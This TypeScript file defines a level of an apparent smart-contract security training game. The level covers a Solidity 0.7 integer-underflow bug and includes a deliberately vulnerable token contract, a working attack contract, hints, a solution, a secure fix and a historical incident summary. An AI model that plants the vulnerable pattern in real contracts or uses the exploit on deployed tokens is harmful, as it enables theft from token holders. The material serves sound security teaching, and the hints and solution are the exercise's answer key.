import type { Level } from '@/types';

const level: Level = {
  id: 4,
  title: 'Integer Overflow',
  slug: 'overflow',
  difficulty: 'Medium',
  category: 'Arithmetic',
  description:
    'In Solidity versions before 0.8.0, arithmetic operations do not check for overflow or underflow by default. A uint256 that underflows past 0 wraps around to 2^256 - 1, an astronomically large number. Attackers can exploit this to mint virtually unlimited tokens or bypass balance checks.',
  objective:
    'Exploit the integer underflow in the transfer() function to give yourself a near-infinite token balance.',
  vulnerableContract: `// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

// Vulnerable: Solidity <0.8.0 has no built-in overflow protection
contract VulnerableToken {
    mapping(address => uint256) public balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) {
        balances[msg.sender] = _initialSupply;
        totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        // Vulnerability: This subtraction can underflow!
        // If _value > balances[msg.sender], the result wraps around
        // to a huge number instead of reverting
        require(balances[msg.sender] - _value >= 0, "Insufficient balance");

        balances[msg.sender] -= _value;
        balances[_to] += _value;

        return true;
    }

    function balanceOf(address _owner) public view returns (uint256) {
        return balances[_owner];
    }
}`,
  attackContract: `// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

import "./VulnerableToken.sol";

contract OverflowAttack {
    VulnerableToken public token;

    constructor(address _tokenAddress) {
        token = VulnerableToken(_tokenAddress);
    }

    function attack() external {
        // The attacker has 0 tokens. Transferring 1 token will cause:
        // balances[attacker] - 1 = 0 - 1 = 2^256 - 1 (underflow!)
        // The require check: (2^256 - 1) >= 0 is always true
        // After transfer: attacker balance becomes 2^256 - 1
        token.transfer(msg.sender, 1);
    }

    function getBalance() external view returns (uint256) {
        return token.balanceOf(address(this));
    }
}`,
  hints: [
    'Look at the require statement in transfer(). What happens when you subtract a larger number from a smaller one with uint256 in Solidity 0.7?',
    'The expression balances[msg.sender] - _value uses unsigned integer arithmetic. If balances[msg.sender] is 0 and _value is 1, the result is not -1. It wraps around to 2^256 - 1. Does the require check catch this?',
    'Call transfer() with any non-zero _value when your balance is 0. The subtraction underflows, the require passes (any uint >= 0 is trivially true), and your balance wraps to an enormous number.',
  ],
  solution:
    'Call transfer(anyAddress, 1) from an account with 0 token balance. In Solidity 0.7, the subtraction 0 - 1 underflows to 2^256 - 1 (a number with 78 digits). The require statement checks if this result >= 0, which is always true for any uint256. The function proceeds to set balances[attacker] = 0 - 1 = 2^256 - 1, giving the attacker a near-infinite balance.',
  explanation:
    'The vulnerability has two parts. First, Solidity versions before 0.8.0 perform unchecked arithmetic -- unsigned integer subtraction wraps around instead of reverting. Second, the require check is logically meaningless: require(balances[msg.sender] - _value >= 0) is always true because uint256 values are by definition never negative. The correct check would be require(balances[msg.sender] >= _value), which compares before subtracting. Solidity 0.8.0 introduced built-in overflow and underflow checks that automatically revert on wrap-around, making this class of bugs largely obsolete in modern contracts.',
  secureCoding: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Fix 1: Use Solidity 0.8+ which has built-in overflow protection
contract SecureToken {
    mapping(address => uint256) public balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) {
        balances[msg.sender] = _initialSupply;
        totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        // In Solidity 0.8+, this subtraction will automatically
        // revert if _value > balances[msg.sender]
        require(balances[msg.sender] >= _value, "Insufficient balance");

        balances[msg.sender] -= _value;
        balances[_to] += _value;

        return true;
    }

    function balanceOf(address _owner) public view returns (uint256) {
        return balances[_owner];
    }
}

// Fix 2: For Solidity <0.8, use OpenZeppelin SafeMath
// import "@openzeppelin/contracts/math/SafeMath.sol";
// using SafeMath for uint256;
// balances[msg.sender] = balances[msg.sender].sub(_value);
// This reverts on underflow instead of wrapping around.`,
  realWorldImpact:
    'BEC Token Hack (2018) - The Beauty Chain (BEC) token on Ethereum had an integer overflow vulnerability in its batchTransfer() function. An attacker crafted a transaction that overflowed a multiplication, allowing them to generate an astronomical number of tokens out of thin air. The exploit instantly crashed the BEC token price to zero and triggered multiple exchange delistings. The total loss was estimated at over $900 million in token market cap. This led to widespread adoption of OpenZeppelin SafeMath in pre-0.8 contracts.',
  moduleMapping: 'Module 3.4 Secure Code Review',
  attackSteps: [
    {
      title: 'Identify Compiler Version',
      description:
        'The attacker notices the contract uses pragma solidity ^0.7.0, which lacks built-in overflow and underflow protection.',
      stateChange: 'Reconnaissance: pre-0.8.0 Solidity identified',
    },
    {
      title: 'Analyze the Require Check',
      description:
        'The require statement checks (balances[msg.sender] - _value >= 0). Since uint256 is unsigned and wraps on underflow, this condition is always true. The check is meaningless.',
      stateChange: 'Vulnerability confirmed: tautological require check',
    },
    {
      title: 'Trigger Underflow',
      description:
        'The attacker calls transfer() with _value = 1 while having a balance of 0. The subtraction 0 - 1 wraps to 2^256 - 1.',
      code: 'token.transfer(someAddress, 1);',
      stateChange: 'balances[attacker]: 0 -> 2^256 - 1 (underflow)',
    },
    {
      title: 'Attacker Holds Maximum Tokens',
      description:
        'The attacker now holds 115792089237316195423570985008687907853269984665640564039457584007913129639935 tokens (2^256 - 1). They can sell or transfer these tokens freely.',
      stateChange: 'Attacker controls virtually the entire token supply',
    },
  ],
};

export default level;
